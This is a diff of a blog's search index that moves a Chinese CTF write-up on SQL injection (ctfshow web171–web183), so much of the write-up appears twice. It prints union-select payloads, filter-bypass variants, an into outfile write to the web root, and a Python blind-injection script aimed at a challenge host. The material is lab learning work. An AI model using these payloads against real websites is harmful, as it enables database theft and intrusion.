@@ -1,6 +1,119 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>web入门sql注入</title>
+    <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
+<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
+<blockquote>
+<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
+<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
+<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
+<p>而且会进行正则匹配</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
+<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
+<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
+<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
+<blockquote>
+<p>后面又学到了使用<code>base64</code>进行绕过</p>
+</blockquote>
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>对flag和数字进行了过滤，注的时候没有回显</p>
+<p>抓包找一下url</p>
+<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
+<p>师傅们直接上脚本tql</p>
+<p>fw不会，也想不到wwww</p>
+<p>假期一定学</p>
+<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
+<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
+<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
+<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
+</blockquote>
+<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
+<p>仿照web174构造</p>
+<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
+<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
+<blockquote>
+<p>Apache默认根目录是:/var/www/html</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
+<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
+<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
+<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
+<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
+<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
+<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
+<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
+<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
+<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
+<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
+<blockquote>
+<p>空格绕过的方式：</p>
+<ol>
+<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
+<li>括号绕过，常用于时间盲注</li>
+</ol>
+</blockquote>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
+<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
+<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
+<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
+<p>晴天师傅的通杀payload</p>
+<p><code>?id=&#39;or(1)%23</code></p>
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
+<p>贴上Y4tacker师傅的</p>
+<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
+<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
+<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
+<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
+<p>又因为and的优先级比or高，那就又相当于</p>
+<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
+<p>or右边的值为1，可以读出id=26的数据</p>
+<p>还可以盲注</p>
+<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
+<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
+<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
+<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
+<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
+<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
+<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
+<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
+]]></content>
+      <categories>
+        <category>ctf-sql</category>
+      </categories>
+      <tags>
+        <tag>ctf-sql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Lampiao</title>
     <url>/2021/05/24/Lampiao/</url>
     <content><![CDATA[<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><p><img src="/2021/05/24/Lampiao/image-20210519163046106.png" alt="image-20210519163046106"></p>
@@ -166,119 +279,6 @@
       </tags>
   </entry>
   <entry>
-    <title>web入门sql注入</title>
-    <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
-<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
-<blockquote>
-<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
-<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
-<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
-<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
-<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
-<p>而且会进行正则匹配</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
-<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
-<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
-<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
-<blockquote>
-<p>后面又学到了使用<code>base64</code>进行绕过</p>
-</blockquote>
-<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
-<p>对flag和数字进行了过滤，注的时候没有回显</p>
-<p>抓包找一下url</p>
-<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
-<p>师傅们直接上脚本tql</p>
-<p>fw不会，也想不到wwww</p>
-<p>假期一定学</p>
-<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
-<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
-<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
-<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
-<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
-</blockquote>
-<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
